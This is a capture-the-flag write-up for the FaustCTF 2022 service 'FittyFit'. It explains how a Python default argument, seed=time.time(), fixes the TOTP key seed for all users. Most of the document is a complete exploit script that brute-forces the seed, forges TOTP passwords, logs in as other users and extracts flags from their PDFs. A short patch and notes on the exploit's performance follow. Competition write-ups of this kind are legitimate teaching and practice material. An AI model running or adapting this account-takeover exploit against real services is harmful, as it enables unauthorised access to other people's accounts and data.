The service stores flags in PDFs that are accessible by logging in to the checker's account. The vulnerability we exploited is in this function from `helper.py`, which is used to generate TOTP keys when registering:
```python
def generate_key(user, seed=time.time(), length=12):
    # Generate the TOTP key
    seed = str(int(seed))
    random.seed(user + seed)
    chars = string.ascii_letters + string.digits
    print(seed)
    return seed, "".join([random.choice(chars) for _ in range(length)])
```
Here the default argument `seed=time.time()` is only evaluated once, when the server starts. This means that `seed` is fixed for all users. We can register an account, brute force its seed (by counting down from the current UNIX timestamp) and compute TOTP keys for MrFlags. The flags are encoded as zlib streams in their PDFs.

Exploit:

```python
#!/usr/bin/env python3
import zlib
import random
import sys
import struct
import hmac
import hashlib
import base64
import string
import time
import requests
def totp(key, interval=60, past=0):
    # Generate the currect TOTP
    now=time.time() - past * 60
    try:
        key = key.encode()
        counter = struct.pack('>Q', int(now / interval))
        mac = hmac.new(key, counter, hashlib.sha256).digest()
        password = base64.b32encode(mac).decode().replace("=", "")
    except Exception as e:
        print(e)
        password = None
    return password
def generate_key(user, seed=time.time(), length=12):
    # Generate the TOTP key
    seed = str(int(seed))
    random.seed(user + seed)
    chars = string.ascii_letters + string.digits
    #print(seed)
    return seed, "".join([random.choice(chars) for _ in range(length)])
print(sys.argv[1])

SERVICE = 'FittyFit'

def extract_team_number(IP: str):
    r_pos = IP.find('::')
    l_pos = len('fd66:666')
    return IP[l_pos + 1:r_pos]


def get_attack_data(IP) -> [str]:
    r = requests.get(
        'https://2022.faustctf.net/competition/teams.json',
    )
    r.raise_for_status()
    data = r.json()
    #print(data)
    teams = data['teams']
    team_num = extract_team_number(IP)
    if int(team_num) not in teams:
        return []
    flag_ids = data['flag_ids']
    #print('flag_ids',[a for a in flag_ids])
    srv_dict = flag_ids.get(SERVICE, {})
    #print(srv_dict)
    return srv_dict.get(str(team_num), [])
url = 'http://['+sys.argv[1]+']:5001'
atk_dat = get_attack_data(sys.argv[1])
print(atk_dat)

uname = 'u'+str(random.getrandbits(64))
ses = requests.Session()
resp = ses.post(url+'/register',data={'name':uname})
key = resp.text.split('<b>')[1].split('</b')[0]
ct = int(time.time())
for t in range(ct,ct-36000,-1):
    seed,k = generate_key(uname,t)
    if key == k:
        kseed = seed
        break
_,key = generate_key(uname,kseed)
pwd = totp(key)
resp = ses.post(url+'/login',data={'name':uname,'pass':pwd})

for uname in atk_dat:
    print(kseed)
    _,key = generate_key(uname,kseed)
    pwd = totp(key)
    print('pwd',pwd)
    ses = requests.Session()
    resp = ses.post(url+'/login',data={'name':uname,'pass':pwd})
    print(resp.text)
    for l in resp.text.splitlines():
        if 'iframe' not in l: continue
        nft = l.split('"')[1]
        t = ses.get(url+nft).content
        if len(t) > 10000: continue
        for x in t.split(b'\nstream\n'):
            for y in x.split(b'\nendstream\n'):
                #print(y)
                try:
                    s = zlib.decompress(y)
                    print('FLAG', s, flush=True)
                except: pass
```

It's still possible to brute force the seed if time.time() is used correctly, but it would probably require too many requests to attack all teams. Our patch:

```python
def generate_key(user, seed=time.time(), length=12):
    # Generate the TOTP key
    seed = str(int(seed))
    random.seed("gaifjdaglega"+user + seed)
    chars = string.ascii_letters + string.digits
    print(seed)
    return seed, "".join([random.choice(chars) for _ in range(length)])
```


Initially our exploit obtained the list of users by using the /search endpoint. As more users were created, the list became too long and the exploit started timing out. Because of this we got very few flags for ticks 20-58.
